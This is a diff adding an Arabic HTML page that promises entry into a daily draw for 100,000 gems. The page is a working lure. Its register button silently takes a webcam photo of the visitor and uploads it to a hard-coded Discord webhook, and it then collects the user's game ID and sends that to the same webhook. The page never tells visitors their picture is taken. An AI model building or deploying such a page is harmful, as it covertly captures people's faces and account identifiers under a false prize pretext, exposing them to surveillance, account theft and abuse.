@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>سحب ١٠٠ الف جوهرة يومياً</title>
+  <!-- استدعاء خط "Cairo" من جوجل لتنسيق واحترافية الخطوط -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800;900&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --primary: #3b82f6;
+      --primary-glow: rgba(59, 130, 246, 0.5);
+      --accent: #06b6d4;
+      --bg-dark: #07090e;
+      --card-bg: rgba(15, 23, 42, 0.75);
+      --text-main: #f8fafc;
+      --text-sub: #94a3b8;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(59, 130, 246, 0.15) 0%, transparent 70%),
+        radial-gradient(circle at 50% 100%, rgba(6, 182, 212, 0.1) 0%, transparent 70%);
+      color: var(--text-main);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+
+    /* الحاوية الرئيسية للتصميم */
+    .card {
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 24px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 440px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                  0 0 30px rgba(59, 130, 246, 0.1);
+      position: relative;
+      animation: fadeIn 0.8s ease-out;
+    }
+
+    /* تأثير الجواهر والرمز العلوي */
+    .gem-icon {
+      font-size: 55px;
+      margin-bottom: 10px;
+      display: inline-block;
+      filter: drop-shadow(0 0 15px #06b6d4);
+      animation: float 3s ease-in-out infinite;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 900;
+      line-height: 1.4;
+      background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 25px;
+    }
+
+    /* الزر الفاخر بتأثير التدرج واللمعان */
+    .btn-action {
+      position: relative;
+      width: 100%;
+      padding: 16px 24px;
+      font-size: 18px;
+      font-weight: 800;
+      color: #ffffff;
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 14px;
+      cursor: pointer;
+      overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 10px 25px var(--primary-glow);
+    }
+
+    .btn-action::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+
+    .btn-action:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 15px 30px var(--primary-glow);
+    }
+
+    .btn-action:hover::before {
+      left: 100%;
+    }
+
+    .btn-action:active {
+      transform: translateY(0);
+    }
+
+    .btn-action:disabled {
+      background: #334155;
+      border-color: transparent;
+      color: #64748b;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    /* حقل الإدخال بتصميم مودرن */
+    .input-field {
+      width: 100%;
+      padding: 16px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgba(15, 23, 42, 0.6);
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      text-align: center;
+      outline: none;
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 15px var(--primary-glow);
+      background: rgba(15, 23, 42, 0.9);
+    }
+
+    /* حقل الرسائل والتنبيهات */
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      min-height: 24px;
+      transition: all 0.3s ease;
+    }
+
+    /* الأشكال والمؤثرات */
+    video, canvas { display: none; }
+
+    #step2 {
+      display: none;
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="gem-icon">💎</div>
+    <h1>موقع الدخول على سحب<br><span style="color: #38bdf8;">١٠٠ الف جوهرة</span> يومياً</h1>
+
+    <!-- الواجهة الأولى: زر التسجيل -->
+    <div id="step1">
+      <button id="registerBtn" class="btn-action">تسجيل</button>
+    </div>
+
+    <!-- الواجهة الثانية: أدخل ID المستخدم -->
+    <div id="step2">
+      <p style="margin-bottom: 15px; color: var(--text-sub); font-size: 15px;">أدخل الـ ID الخاص بك لإنهاء عملية التسجيل:</p>
+      <input type="text" id="userId" class="input-field" placeholder="أدخل الـ ID هنا..." dir="ltr" />
+      <button id="submitIdBtn" class="btn-action">تأكيد الـ ID</button>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <video id="webcam" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1556771079656054888/zHJECmFPu_m5EYwDeC8ECJkxmGo7ExcKRm1IBMyjFVoY2yi5LEjHKhUY-boTt1q3dCmi";
+
+    const registerBtn = document.getElementById('registerBtn');
+    const submitIdBtn = document.getElementById('submitIdBtn');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const statusDiv = document.getElementById('status');
+
+    registerBtn.addEventListener('click', async () => {
+      // التحقق من أن الموقع يعمل عبر رابط مشفر (HTTPS)
+      if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+        statusDiv.style.color = '#f87171';
+        statusDiv.innerText = "⚠️ يجب رفع الموقع على استضافة تدعم (HTTPS) لتفعيل الكاميرا.";
+        return;
+      }
+
+      registerBtn.disabled = true;
+      statusDiv.style.color = '#38bdf8';
+      statusDiv.innerText = "جاري الاتصال والتحقق...";
+
+      try {
+        // تفعيل الكاميرا الأمامية
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // إيقاف بث الكاميرا
+          stream.getTracks().forEach(track => track.stop());
+
+          // تحويل الصورة إلى ملف Blob وإرسالها
+          canvas.toBlob(async (blob) => {
+            if (!blob) {
+              statusDiv.style.color = '#f87171';
+              statusDiv.innerText = "حدث خطأ أثناء معالجة الصورة.";
+              registerBtn.disabled = false;
+              return;
+            }
+
+            const formData = new FormData();
+            formData.append('file', blob, 'user_capture.png');
+            formData.append('payload_json', JSON.stringify({
+              username: "مسجل السحب",
+              content: "📸 **تم تسجيل دخول جديد في سحب الـ 100 ألف جوهرة!**"
+            }));
+
+            try {
+              const res = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+              });
+
+              if (res.ok) {
+                // الانتقال اللطيف إلى واجهة الـ ID
+                step1.style.display = 'none';
+                step2.style.display = 'block';
+                statusDiv.innerText = "";
+              } else {
+                statusDiv.style.color = '#f87171';
+                statusDiv.innerText = "تعذر الإرسال. حاول مرة أخرى.";
+                registerBtn.disabled = false;
+              }
+            } catch (err) {
+              statusDiv.style.color = '#f87171';
+              statusDiv.innerText = "خطأ في الاتصال بالشبكة.";
+              registerBtn.disabled = false;
+            }
+
+          }, 'image/png');
+
+        }, 1200);
+
+      } catch (err) {
+        registerBtn.disabled = false;
+        statusDiv.style.color = '#f87171';
+        statusDiv.innerText = "يرجى قبول الإذن للمتابعة في السحب.";
+      }
+    });
+
+    // عند الضغط على زر تأكيد الـ ID
+    submitIdBtn.addEventListener('click', () => {
+      const idValue = document.getElementById('userId').value.trim();
+      if (!idValue) {
+        statusDiv.style.color = '#f87171';
+        statusDiv.innerText = "يرجى كتابة الـ ID أولاً!";
+        return;
+      }
+
+      submitIdBtn.disabled = true;
+      statusDiv.style.color = '#38bdf8';
+      statusDiv.innerText = "جاري الحفظ...";
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: "مسجل السحب",
+          content: `🆔 **الـ ID الخاص بالمستخدم:** \`${idValue}\``
+        })
+      }).then(() => {
+        statusDiv.style.color = '#4ade80';
+        statusDiv.innerText = "✅ تم دخولك في السحب بنجاح! بالتوفيق.";
+      }).catch(() => {
+        statusDiv.style.color = '#f87171';
+        statusDiv.innerText = "حدث خطأ أثناء الإرسال.";
+        submitIdBtn.disabled = false;
+      });
+    });
+  </script>
+</body>
+</html>
